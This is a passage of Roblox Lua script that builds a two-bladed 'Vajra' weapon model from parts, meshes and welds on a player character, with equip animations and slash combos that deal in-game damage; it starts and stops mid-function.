			LW.C0 = clerp(LW.C0,cf(-1.25, 0.25, -0.25) * euler(0.5,0,.15),0.6)
		end
		
		-- animations end
		
	else
		if Init == true then
			for i=0,.5,0.1 do
			--anim reset		
				Neck.C0=clerp(Neck.C0,necko,0.5)
				RootJoint.C0=clerp(RootJoint.C0,RootCF,0.5)
				RW.C0 = clerp(RW.C0,cf(1.5, 0.25, 0), 0.5)
				LW.C0 = clerp(RW.C0,cf(-1.5, 0.25, 0),0.5)
				RHW.C0 = clerp(RHW.C0,cf(1, -1, 0),0.5)
				LHW.C0 = clerp(RHW.C0,cf(-1, -1, 0),0.5)
			
				if SFX ~= nil then
					SFX:Stop()
					SFX:Destroy()
					SFX = nil
				end
			
				RW.Parent=nil
				LW.Parent=nil
				RHW.Parent=nil
				LHW.Parent=nil
				
				RSH.Parent=Character.Torso
				LSH.Parent=Character.Torso
				RH.Parent=Character.Torso
				LH.Parent=Character.Torso
				
				
				if Character:FindFirstChild("Animate1") ~= nil then
					Character:FindFirstChild("Animate1").Disabled = false
				end
				Init = false
				if Toggle == true then
					break
				end
			end
		end
		
	end
end

Hum1.Died:connect(function() Toggle = false; script:Remove(); end)
end}
module[5] = {"Vajra",function()
Player = game:GetService("Players").LocalPlayer
Character = Player.Character 
PlayerGui = Player.PlayerGui 
Backpack = Player.Backpack 
Torso = Character.Torso 
Head = Character.Head 
LeftArm = Character["Left Arm"] 
LeftLeg = Character["Left Leg"] 
RightArm = Character["Right Arm"] 
RightLeg = Character["Right Leg"] 
LS = Torso["Left Shoulder"] 
LH = Torso["Left Hip"] 
RS = Torso["Right Shoulder"] 
RH = Torso["Right Hip"] 
bladecolor = BrickColor.new("New Yeller") 
attack = false 
attackdebounce = false 
attacktype = 1 
combo = 0 
damage = 3 
oridamage = 3 
walkdebounce = false 
sheathed = true 
holdingW = false 
holdingA = false 
holdingS = false 
holdingD = false 
--player 
player = nil 
--save shoulders 
RSH, LSH = nil, nil 
--welds 
RW, LW = Instance.new("Weld"), Instance.new("Weld") 
RW2, LW2 = Instance.new("Weld"), Instance.new("Weld") 
--what anim 
anim = "none" 
if Character:findFirstChild("Vajra",true) ~= nil then 
Character:findFirstChild("Vajra",true).Parent = nil 
end 
        
local modelzorz = Instance.new("Model") 
modelzorz.Name = "Vajra" 
modelzorz.Parent = Character 
local prt1 = Instance.new("Part") 
prt1.formFactor = 1 
prt1.Parent = modelzorz 
prt1.CanCollide = false 
prt1.BrickColor = Character.Torso.BrickColor
prt1.Name = "Handle1" 
prt1.Size = Vector3.new(1,2,1) 
prt1.CFrame = Torso.CFrame 
local prt2 = Instance.new("Part") 
prt2.formFactor = 1 
prt2.Parent = modelzorz 
prt2.CanCollide = false 
prt2.BrickColor = BrickColor.new("Bright blue") 
prt2.Name = "Handle2" 
prt2.Size = Vector3.new(1,1,1) 
prt2.CFrame = Torso.CFrame 
local prt3 = Instance.new("Part") 
prt3.formFactor = 1 
prt3.Parent = modelzorz 
prt3.CanCollide = false 
prt3.BrickColor = BrickColor.new("Bright yellow") 
prt3.Name = "Handle3" 
prt3.Size = Vector3.new(1,1,1) 
prt3.CFrame = Torso.CFrame 
local prt4 = Instance.new("Part") 
prt4.formFactor = 1 
prt4.Parent = modelzorz 
prt4.CanCollide = false 
prt4.BrickColor = BrickColor.new("White") 
prt4.Name = "Handle4" 
prt4.Size = Vector3.new(0.5,0.5,0.5) 
prt4.CFrame = Torso.CFrame 
local prt5 = Instance.new("Part") 
prt5.formFactor = 1 
prt5.Parent = modelzorz 
prt5.CanCollide = false 
prt5.BrickColor = BrickColor.new("Bright blue") 
prt5.Name = "Handle5" 
prt5.Size = Vector3.new(1,0.5,1) 
prt5.CFrame = Torso.CFrame 
local prt6 = Instance.new("Part") 
prt6.formFactor = 1 
prt6.Parent = modelzorz 
prt6.CanCollide = false 
prt6.BrickColor = BrickColor.new("White") 
prt6.Name = "Blade1" 
prt6.Size = Vector3.new(1,0.5,1) 
prt6.CFrame = Torso.CFrame 
local prt7 = Instance.new("Part") 
prt7.formFactor = 1 
prt7.Parent = modelzorz 
prt7.CanCollide = false 
prt7.BrickColor = BrickColor.new("White") 
prt7.Name = "Blade2" 
prt7.Size = Vector3.new(1,0.5,1) 
prt7.CFrame = Torso.CFrame 
local prt8 = Instance.new("Part") 
prt8.formFactor = 1 
prt8.Parent = modelzorz 
prt8.CanCollide = false 
prt8.BrickColor = BrickColor.new("White") 
prt8.Name = "Blade3" 
prt8.Size = Vector3.new(1,0.5,1) 
prt8.CFrame = Torso.CFrame 
local prt9 = prt2:Clone() 
prt9.Parent = modelzorz 
prt9.Name = "Handle6" 
prt9.Size = Vector3.new(1,1,1) 
prt9.CFrame = Torso.CFrame 
local prt10 = prt3:Clone() 
prt10.Parent = modelzorz 
prt10.Name = "Handle7" 
prt10.Size = Vector3.new(1,1,1) 
prt10.CFrame = Torso.CFrame 
local prt11 = prt4:Clone() 
prt11.Parent = modelzorz 
prt11.Name = "Handle8" 
prt11.Size = Vector3.new(1,0.5,1) 
prt11.CFrame = Torso.CFrame 
local prt12 = prt5:Clone() 
prt12.Parent = modelzorz 
prt12.Name = "Handle9" 
prt12.Size = Vector3.new(1,0.5,1) 
prt12.CFrame = Torso.CFrame 
local prt13 = prt6:Clone() 
prt13.Parent = modelzorz 
prt13.Name = "Blade4" 
prt13.Size = Vector3.new(1,0.5,1) 
prt13.CFrame = Torso.CFrame 
local prt14 = prt7:Clone() 
prt14.Parent = modelzorz 
prt14.Name = "Blade5" 
prt14.Size = Vector3.new(1,0.5,1) 
prt14.CFrame = Torso.CFrame 
local prt15 = prt8:Clone() 
prt15.Parent = modelzorz 
prt15.Name = "Blade6" 
prt15.Size = Vector3.new(1,0.5,1) 
prt15.CFrame = Torso.CFrame 
local part1 = Instance.new("Part") 
part1.formFactor = 1 
part1.Parent = modelzorz 
part1.CanCollide = false 
part1.BrickColor = Character.Torso.BrickColor
part1.Name = "2Handle1" 
part1.Size = Vector3.new(1,2,1) 
part1.CFrame = Torso.CFrame 
local part2 = Instance.new("Part") 
part2.formFactor = 1 
part2.Parent = modelzorz 
part2.CanCollide = false 
part2.BrickColor = BrickColor.new("Bright blue") 
part2.Name = "2Handle2" 
part2.Size = Vector3.new(1,1,1) 
part2.CFrame = Torso.CFrame 
local part3 = Instance.new("Part") 
part3.formFactor = 1 
part3.Parent = modelzorz 
part3.CanCollide = false 
part3.BrickColor = BrickColor.new("Bright yellow") 
part3.Name = "2Handle3" 
part3.Size = Vector3.new(1,1,1) 
part3.CFrame = Torso.CFrame 
local part4 = Instance.new("Part") 
part4.formFactor = 1 
part4.Parent = modelzorz 
part4.CanCollide = false 
part4.BrickColor = BrickColor.new("White") 
part4.Name = "2Handle4" 
part4.Size = Vector3.new(1,0.5,1) 
part4.CFrame = Torso.CFrame 
local part5 = Instance.new("Part") 
part5.formFactor = 1 
part5.Parent = modelzorz 
part5.CanCollide = false 
part5.BrickColor = BrickColor.new("Bright blue") 
part5.Name = "2Handle5" 
part5.Size = Vector3.new(1,0.5,1) 
part5.CFrame = Torso.CFrame 
local part6 = Instance.new("Part") 
part6.formFactor = 1 
part6.Parent = modelzorz 
part6.CanCollide = false 
part6.BrickColor = BrickColor.new("White") 
part6.Name = "2Blade1" 
part6.Size = Vector3.new(1,0.5,1) 
part6.CFrame = Torso.CFrame 
local part7 = Instance.new("Part") 
part7.formFactor = 1 
part7.Parent = modelzorz 
part7.CanCollide = false 
part7.BrickColor = BrickColor.new("White") 
part7.Name = "2Blade2" 
part7.Size = Vector3.new(1,0.5,1) 
part7.CFrame = Torso.CFrame 
local part8 = Instance.new("Part") 
part8.formFactor = 1 
part8.Parent = modelzorz 
part8.CanCollide = false 
part8.BrickColor = BrickColor.new("White") 
part8.Name = "2Blade3" 
part8.Size = Vector3.new(1,0.5,1) 
part8.CFrame = Torso.CFrame 
local part9 = part2:Clone() 
part9.Parent = modelzorz 
part9.Name = "2Handle6" 
part9.Size = Vector3.new(1,1,1) 
part9.CFrame = Torso.CFrame 
local part10 = part3:Clone() 
part10.Parent = modelzorz 
part10.Name = "2Handle7" 
part10.Size = Vector3.new(1,1,1) 
part10.CFrame = Torso.CFrame 
local part11 = part4:Clone() 
part11.Parent = modelzorz 
part11.Name = "2Handle8" 
part11.Size = Vector3.new(1,0.5,1) 
part11.CFrame = Torso.CFrame 
local part12 = part5:Clone() 
part12.Parent = modelzorz 
part12.Name = "2Handle9" 
part12.Size = Vector3.new(1,0.5,1) 
part12.CFrame = Torso.CFrame 
local part13 = part6:Clone() 
part13.Parent = modelzorz 
part13.Name = "2Blade4" 
part13.Size = Vector3.new(1,0.5,1) 
part13.CFrame = Torso.CFrame 
local part14 = part7:Clone() 
part14.Parent = modelzorz 
part14.Name = "2Blade5" 
part14.Size = Vector3.new(1,0.5,1) 
part14.CFrame = Torso.CFrame 
local part15 = part8:Clone() 
part15.Parent = modelzorz 
part15.Name = "2Blade6" 
part15.Size = Vector3.new(1,0.5,1) 
part15.CFrame = Torso.CFrame 
modelzorz:BreakJoints() 
local msh1 = Instance.new("CylinderMesh") 
msh1.Parent = prt1 
msh1.Scale = Vector3.new(0.31,0.7,0.31) 
local msh2 = Instance.new("CylinderMesh") 
msh2.Parent = prt2 
msh2.Scale = Vector3.new(0.4,0.3,0.4) 
local msh3 = Instance.new("CylinderMesh") 
msh3.Parent = prt3 
msh3.Scale = Vector3.new(0.41,0.3,0.41) 
local msh4 = Instance.new("BlockMesh") 
msh4.Parent = prt4 
msh4.Scale = Vector3.new(0.47,0.35,0.4) 
local msh5 = Instance.new("BlockMesh") 
msh5.Parent = prt5 
msh5.Scale = Vector3.new(0.37,0.55,0.6) 
local msh6 = Instance.new("SpecialMesh") 
msh6.Parent = prt6 
msh6.MeshId = "http://www.roblox.com/asset/?id=1778999"
msh6.Scale = Vector3.new(0.35,0.4,0.25) 
local msh7 = Instance.new("SpecialMesh") 
msh7.Parent = prt7 
msh7.MeshId = "http://www.roblox.com/asset/?id=1778999"
msh7.Scale = Vector3.new(0.35,0.4,0.25) 
local msh8 = Instance.new("SpecialMesh") 
msh8.Parent = prt8 
msh8.MeshId = "http://www.roblox.com/asset/?id=1778999"
msh8.Scale = Vector3.new(0.35,0.6,0.25) 
local msh9 = msh2:Clone() 
msh9.Parent = prt9 
local msh10 = msh3:Clone() 
msh10.Parent = prt10 
local msh11 = msh4:Clone() 
msh11.Parent = prt11 
local msh12 = msh5:Clone() 
msh12.Parent = prt12 
local msh13 = msh6:Clone() 
msh13.Parent = prt13 
local msh14 = msh7:Clone() 
msh14.Parent = prt14 
local msh15 = msh8:Clone() 
msh15.Parent = prt15 
local mesh1 = Instance.new("CylinderMesh") 
mesh1.Parent = part1 
mesh1.Scale = Vector3.new(0.31,0.7,0.31) 
local mesh2 = Instance.new("CylinderMesh") 
mesh2.Parent = part2 
mesh2.Scale = Vector3.new(0.4,0.3,0.4) 
local mesh3 = Instance.new("CylinderMesh") 
mesh3.Parent = part3 
mesh3.Scale = Vector3.new(0.41,0.3,0.41) 
local mesh4 = Instance.new("BlockMesh") 
mesh4.Parent = part4 
mesh4.Scale = Vector3.new(0.47,0.35,0.4) 
local mesh5 = Instance.new("BlockMesh") 
mesh5.Parent = part5 
mesh5.Scale = Vector3.new(0.37,0.55,0.6) 
local mesh6 = Instance.new("SpecialMesh") 
mesh6.Parent = part6 
mesh6.MeshId = "http://www.roblox.com/asset/?id=1778999"
mesh6.Scale = Vector3.new(0.35,0.4,0.25) 
local mesh7 = Instance.new("SpecialMesh") 
mesh7.Parent = part7 
mesh7.MeshId = "http://www.roblox.com/asset/?id=1778999"
mesh7.Scale = Vector3.new(0.35,0.4,0.25) 
local mesh8 = Instance.new("SpecialMesh") 
mesh8.Parent = part8 
mesh8.MeshId = "http://www.roblox.com/asset/?id=1778999"
mesh8.Scale = Vector3.new(0.35,0.6,0.25) 
local mesh9 = mesh2:Clone() 
mesh9.Parent = part9 
local mesh10 = mesh3:Clone() 
mesh10.Parent = part10 
local mesh11 = mesh4:Clone() 
mesh11.Parent = part11 
local mesh12 = mesh5:Clone() 
mesh12.Parent = part12 
local mesh13 = mesh6:Clone() 
mesh13.Parent = part13 
local mesh14 = mesh7:Clone() 
mesh14.Parent = part14 
local mesh15 = mesh8:Clone() 
mesh15.Parent = part15 
local wld1 = Instance.new("Weld") 
wld1.Parent = prt1 
wld1.Part0 = prt1 
wld1.Part1 = Torso 
wld1.C0 = CFrame.fromEulerAnglesXYZ(0,0,0.7) * CFrame.new(0,0,-0.75) 
local wld2 = Instance.new("Weld") 
wld2.Parent = prt2 
wld2.Part0 = prt2 
wld2.Part1 = prt1 
wld2.C0 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,0.6,0) 
local wld3 = Instance.new("Weld") 
wld3.Parent = prt3 
wld3.Part0 = prt3 
wld3.Part1 = prt1 
wld3.C0 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,0.9,0) 
local wld4 = Instance.new("Weld") 
wld4.Parent = prt4 
wld4.Part0 = prt4 
wld4.Part1 = prt1 
wld4.C0 = CFrame.fromEulerAnglesXYZ(0.8,math.rad(90),0) * CFrame.new(0,1.2,0) 
local wld5 = Instance.new("Weld") 
wld5.Parent = prt5 
wld5.Part0 = prt5 
wld5.Part1 = prt4 
wld5.C0 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,0,0) 
local wld6 = Instance.new("Weld") 
wld6.Parent = prt6 
wld6.Part0 = prt6 
wld6.Part1 = prt1 
wld6.C0 = CFrame.fromEulerAnglesXYZ(0,0,-math.rad(90)) * CFrame.new(0.5,1.25,0) 
local wld7 = Instance.new("Weld") 
wld7.Parent = prt7 
wld7.Part0 = prt7 
wld7.Part1 = prt1 
wld7.C0 = CFrame.fromEulerAnglesXYZ(0,0,math.rad(90)) * CFrame.new(-0.5,1.25,0) 
local wld8 = Instance.new("Weld") 
wld8.Parent = prt8 
wld8.Part0 = prt8 
wld8.Part1 = prt1 
wld8.C0 = CFrame.fromEulerAnglesXYZ(0,0,math.rad(180)) * CFrame.new(0,1.7,0) 
local wld9 = Instance.new("Weld") 
wld9.Parent = prt9 
wld9.Part0 = prt9 
wld9.Part1 = prt1 
wld9.C0 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,-0.6,0) 
local wld10 = Instance.new("Weld") 
wld10.Parent = prt10 
wld10.Part0 = prt10 
wld10.Part1 = prt1 
wld10.C0 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,-0.9,0) 
local wld11 = Instance.new("Weld") 
wld11.Parent = prt11 
wld11.Part0 = prt11 
wld11.Part1 = prt1 
wld11.C0 = CFrame.fromEulerAnglesXYZ(0.8,math.rad(90),0) * CFrame.new(0,-1.2,0) 
local wld12 = Instance.new("Weld") 
wld12.Parent = prt12 
wld12.Part0 = prt12 
wld12.Part1 = prt11 
wld12.C0 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,0,0) 
local wld13 = Instance.new("Weld") 
wld13.Parent = prt13 
wld13.Part0 = prt13 
wld13.Part1 = prt1 
wld13.C0 = CFrame.fromEulerAnglesXYZ(0,0,-math.rad(90)) * CFrame.new(0.5,-1.25,0) 
local wld14 = Instance.new("Weld") 
wld14.Parent = prt14 
wld14.Part0 = prt14 
wld14.Part1 = prt1 
wld14.C0 = CFrame.fromEulerAnglesXYZ(0,0,math.rad(90)) * CFrame.new(-0.5,-1.25,0) 
local wld15 = Instance.new("Weld") 
wld15.Parent = prt15 
wld15.Part0 = prt15 
wld15.Part1 = prt1 
wld15.C0 = CFrame.fromEulerAnglesXYZ(math.rad(180),0,math.rad(180)) * CFrame.new(0,-1.7,0) 
local weld1 = Instance.new("Weld") 
weld1.Parent = part1 
weld1.Part0 = part1 
weld1.Part1 = Torso 
weld1.C0 = CFrame.fromEulerAnglesXYZ(0,0,-0.7) * CFrame.new(0,0,-0.75) 
local weld2 = Instance.new("Weld") 
weld2.Parent = part2 
weld2.Part0 = part2 
weld2.Part1 = part1 
weld2.C0 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,0.6,0) 
local weld3 = Instance.new("Weld") 
weld3.Parent = part3 
weld3.Part0 = part3 
weld3.Part1 = part1 
weld3.C0 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,0.9,0) 
local weld4 = Instance.new("Weld") 
weld4.Parent = part4 
weld4.Part0 = part4 
weld4.Part1 = part1 
weld4.C0 = CFrame.fromEulerAnglesXYZ(0.8,math.rad(90),0) * CFrame.new(0,1.2,0) 
local weld5 = Instance.new("Weld") 
weld5.Parent = part5 
weld5.Part0 = part5 
weld5.Part1 = part4 
weld5.C0 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,0,0) 
local weld6 = Instance.new("Weld") 
weld6.Parent = part6 
weld6.Part0 = part6 
weld6.Part1 = part1 
weld6.C0 = CFrame.fromEulerAnglesXYZ(0,0,-math.rad(90)) * CFrame.new(0.5,1.25,0) 
local weld7 = Instance.new("Weld") 
weld7.Parent = part7 
weld7.Part0 = part7 
weld7.Part1 = part1 
weld7.C0 = CFrame.fromEulerAnglesXYZ(0,0,math.rad(90)) * CFrame.new(-0.5,1.25,0) 
local weld8 = Instance.new("Weld") 
weld8.Parent = part8 
weld8.Part0 = part8 
weld8.Part1 = part1 
weld8.C0 = CFrame.fromEulerAnglesXYZ(0,0,math.rad(180)) * CFrame.new(0,1.7,0) 
local weld9 = Instance.new("Weld") 
weld9.Parent = part9 
weld9.Part0 = part9 
weld9.Part1 = part1 
weld9.C0 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,-0.6,0) 
local weld10 = Instance.new("Weld") 
weld10.Parent = part10 
weld10.Part0 = part10 
weld10.Part1 = part1 
weld10.C0 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,-0.9,0) 
local weld11 = Instance.new("Weld") 
weld11.Parent = part11 
weld11.Part0 = part11 
weld11.Part1 = part1 
weld11.C0 = CFrame.fromEulerAnglesXYZ(0.8,math.rad(90),0) * CFrame.new(0,-1.2,0) 
local weld12 = Instance.new("Weld") 
weld12.Parent = part12 
weld12.Part0 = part12 
weld12.Part1 = part11 
weld12.C0 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,0,0) 
local weld13 = Instance.new("Weld") 
weld13.Parent = part13 
weld13.Part0 = part13 
weld13.Part1 = part1 
weld13.C0 = CFrame.fromEulerAnglesXYZ(0,0,-math.rad(90)) * CFrame.new(0.5,-1.25,0) 
local weld14 = Instance.new("Weld") 
weld14.Parent = part14 
weld14.Part0 = part14 
weld14.Part1 = part1 
weld14.C0 = CFrame.fromEulerAnglesXYZ(0,0,math.rad(90)) * CFrame.new(-0.5,-1.25,0) 
local weld15 = Instance.new("Weld") 
weld15.Parent = part15 
weld15.Part0 = part15 
weld15.Part1 = part1 
weld15.C0 = CFrame.fromEulerAnglesXYZ(math.rad(180),0,math.rad(180)) * CFrame.new(0,-1.7,0) 
local gairo = Instance.new("BodyGyro") 
gairo.Parent = nil 
if (script.Parent.className ~= "HopperBin") then 
Tool = Instance.new("HopperBin") 
Tool.Parent = Backpack 
Tool.Name = "Vajra" 
script.Parent = Tool 
end 
Bin = Tool
function unequipweld() 
wld1.Part1 = Torso 
wld1.C0 = CFrame.fromEulerAnglesXYZ(0,0,0.7) * CFrame.new(0,0,-0.75) 
weld1.Part1 = Torso 
weld1.C0 = CFrame.fromEulerAnglesXYZ(0,0,-0.7) * CFrame.new(0,0,-0.75) 
end 
function equipweld() 
wld1.Part1 = LeftArm 
wld1.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0,0) 
wld1.C0 = CFrame.fromEulerAnglesXYZ(-math.rad(90), 0, -1.57) * CFrame.new(0, 1, 0) 
weld1.Part1 = RightArm 
weld1.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0,0) 
weld1.C0 = CFrame.fromEulerAnglesXYZ(-math.rad(90), 0, -1.57) * CFrame.new(0, 1, 0) 
end 
function hideanim() 
for i = 0 , 1 , 0.07 do 
wait(0)  
LW.C0 = CFrame.new(-1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
end 
unequipweld() 
wait(0.2) 
for i = 0 , 1 , 0.07 do 
wait(0)  
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
end 
end 
function equipanim() 
for i = 0 , 1 , 0.085 do 
wait(0)  
LW.C0 = CFrame.new(-1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(-0.3*i,0.3*i,-0.3*i) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2*i,0.2*i,0.5*i) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
end 
equipweld() 
wait(0.1) 
for i = 0 , 1 , 0.075 do 
wait(0)  
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3,-0.3) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2,0.5) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
end 
end 
function oneslash() 
attack = true 
combo = 1 
walking = nil 
Walk = nil 
local vel = Instance.new("BodyVelocity")
vel.Parent = Torso
vel.maxForce = Vector3.new(4e+005,4e+005,4e+005)*2
vel.velocity = Head.CFrame.lookVector * 20 
ss(workspace,1) 
con1=prt1.Touched:connect(function(hit) Damagefunc1(hit,10,10) end)
for i = 0,1,0.2 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.67+0.3*i,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3,-0.3) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(2.5-2.8*i,1.57,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2,0.5) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.2,0,-0.5*i) 
end 
vel.Parent = nil 
con1:disconnect() 
wait(0.1) 
attack = false 
end 
function twoslash() 
attack = true 
combo = 2 
local vel = Instance.new("BodyVelocity")
vel.Parent = Torso
vel.maxForce = Vector3.new(4e+005,4e+005,4e+005)*2
vel.velocity = Head.CFrame.lookVector * 20 
ss(workspace,1) 
con1=prt1.Touched:connect(function(hit) Damagefunc1(hit,10,10) end)
for i = 0,1,0.2 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.67+0.3-0.4*i,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3,-0.3) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(2.5-2.8,-0.3,1.3*i) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2,0.5) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.2,0,-0.5) 
end 
vel.Parent = nil 
con1:disconnect() 
wait(0.1) 
attack = false 
end 
function threeslash() 
attack = true 
combo = 3 
gairo.Parent = Head
gairo.maxTorque = Vector3.new(4e+005,4e+005,4e+005)*math.huge 
gairo.P = 20e+003 
gairo.cframe = Head.CFrame 
for i = 0,1,0.2 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57+1.57*i) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3+2.8*i,0.3,-0.3+0.3*i) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3+0.3*i,-0.3+0.3*i,1.3-1.3*i) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2+2.3*i,0.2-0.5*i,0.5-0.5*i) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.2-0.2*i,0,-0.5+0.5*i) 
end 
wait(0.2) 
boomeffect() 
bewm(workspace,1) 
ss(workspace,1) 
for i = 0,1,0.25 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57+0.2*i,3.14,0) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(2.5-1.8*i,0.3-0.6*i,0) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(2.5-1.8*i,-0.3+0.6*i,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
end 
wait(0.05) 
attack = false 
end 
function fourslash() 
attack = true 
combo = 4 
gairo.Parent = Head
gairo.maxTorque = Vector3.new(4e+005,4e+005,4e+005)*math.huge 
gairo.P = 20e+003 
gairo.cframe = Head.CFrame 
wait() 
for i = 0,1,0.2 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57*i) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.7-1*i,-0.3,-0.3*i) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,1.3*i) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(2.5-1.8,-0.3+0.6*i,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,1.57*i,-1*i) 
end 
wait(0.2) 
boomeffect2(LeftArm,10,20) 
bewm(workspace,1) 
ss(workspace,1) 
for i = 0,1,0.3 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.7-1,-0.3,-0.3) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,1.3+0.3*i) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(2.5-1.8,-0.3+0.6,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,1.57,-1) 
end 
for i = 0,1,0.3 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.7-1,-0.3,-0.3) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,1.3+0.3-0.3*i) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(2.5-1.8,-0.3+0.6,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,1.57,-1) 
end 
wait(0.1) 
gairo.Parent = nil 
attack = false 
end 
function dashslash() 
attack = true 
combo = 4 
gairo.Parent = Head
gairo.maxTorque = Vector3.new(4e+005,4e+005,4e+005)*math.huge 
gairo.P = 20e+003 
gairo.cframe = Head.CFrame 
wait() 
for i = 0,1,0.2 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.7-1*i,-0.3,-0.3*i) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,1.3*i) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(2.5-1.8,-0.3+0.6*i,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,1.57*i,-1*i) 
end 
wait(0.2) 
boomeffect2(LeftArm,5,10) 
bewm(workspace,1) 
ss(workspace,1) 
for i = 0,1,0.3 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.7-1,-0.3,-0.3) 
